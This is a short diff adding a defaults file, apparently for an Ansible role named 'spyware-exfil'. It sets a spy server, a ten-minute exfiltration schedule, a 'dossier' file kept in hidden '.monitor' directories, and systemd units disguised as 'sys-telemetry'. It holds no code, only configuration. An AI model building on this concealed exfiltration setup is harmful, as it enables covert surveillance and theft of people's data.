@@ -1,0 +1,11 @@
+---
+# defaults file for spyware-exfil
+
+spy_host: spy-server
+spy_port: 443
+exfil_schedule: "*:0/10"
+exfil_script_path: /usr/local/lib/.monitor/exfil.sh
+dossier_path: /var/lib/.monitor/dossier.txt
+exfil_log: /var/lib/.monitor/exfil.log
+exfil_timer_unit: "sys-telemetry.timer"
+exfil_service_unit: "sys-telemetry.service"
